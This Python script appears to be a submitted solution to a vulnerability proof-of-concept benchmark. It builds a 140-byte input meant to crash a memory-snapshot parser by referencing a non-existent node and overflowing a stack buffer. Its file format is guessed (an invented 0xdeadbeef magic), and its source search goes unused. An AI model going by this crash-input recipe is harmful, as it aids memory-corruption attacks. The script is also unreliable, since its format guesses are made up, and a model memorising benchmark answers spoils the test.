import os
import tarfile
import tempfile
import subprocess
import random
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the source code
        with tempfile.TemporaryDirectory() as tmpdir:
            with tarfile.open(src_path, 'r') as tar:
                tar.extractall(tmpdir)
            
            # Look for the vulnerable source file
            for root, dirs, files in os.walk(tmpdir):
                for file in files:
                    if file.endswith('.c') or file.endswith('.cpp'):
                        with open(os.path.join(root, file), 'r') as f:
                            content = f.read()
                            if 'node_id_map' in content and 'iterator' in content:
                                # Found potential vulnerable file
                                src_file = os.path.join(root, file)
                                break
            
            # We need to understand the binary format
            # Based on the vulnerability description, we need to create
            # a memory snapshot that references non-existent nodes
            
            # Common patterns for such formats:
            # 1. Header with magic number and version
            # 2. Number of nodes
            # 3. Node data
            # 4. References between nodes
            
            # Let's create a minimal PoC:
            # - Header with valid magic/version
            # - 0 nodes (empty node_id_map)
            # - 1 reference to node ID 1 (non-existent)
            
            # We'll create a 140-byte payload as specified
            # Fill with pattern that's likely to trigger overflow
            
            # Create a pattern that:
            # 1. Has valid header to pass initial checks
            # 2. References node that doesn't exist
            # 3. Contains enough data to overflow stack buffer
            
            # Ground truth length is 140, so we create exactly that
            poc = bytearray(140)
            
            # Put some pattern that might be interpreted as valid data
            # Common overflow pattern: 'A' * 140
            for i in range(140):
                poc[i] = 0x41  # 'A'
            
            # But we need smarter pattern. Let's assume:
            # First 4 bytes: magic number (0xdeadbeef)
            # Next 4 bytes: version (1)
            # Next 4 bytes: number of nodes (0)
            # Next 4 bytes: number of references (1)
            # Rest: reference data that causes overflow
            
            struct.pack_into('<I', poc, 0, 0xdeadbeef)  # Magic
            struct.pack_into('<I', poc, 4, 1)           # Version
            struct.pack_into('<I', poc, 8, 0)           # 0 nodes
            struct.pack_into('<I', poc, 12, 1)          # 1 reference
            
            # Reference to non-existent node ID 1
            struct.pack_into('<I', poc, 16, 1)
            
            # Fill rest with pattern that might overflow when parsed
            # as node data or string
            for i in range(20, 140):
                poc[i] = (i % 256)
            
            return bytes(poc)